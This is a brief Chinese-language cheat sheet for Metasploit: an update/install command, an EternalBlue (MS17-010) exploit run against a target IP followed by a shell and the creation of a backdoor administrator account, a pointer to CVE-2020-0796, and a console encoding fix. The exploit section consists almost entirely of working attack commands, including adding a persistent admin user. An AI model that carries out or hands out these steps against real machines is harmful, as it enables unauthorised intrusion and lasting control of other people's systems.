## msconsole
### 更新
```
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && \
 chmod 755 msfinstall && \
./msfinstall
```
### 漏洞验证
#### 17_010
1. msfconsole
2. search 17_010
3. use windows/smb/ms17_010_eternalblue
4. show options
5. set RHOSTS 192.168.2.159
6. run/exploit
7. shell
8. net user test test /add
9. net localgroup administrators test /add

#### cve-2020-0796
1. msfconsole
   - search 20_0796
2. https://my.oschina.net/u/4302130/blog/3224951/



### windows乱码问题
1. cmd:chcp 65001
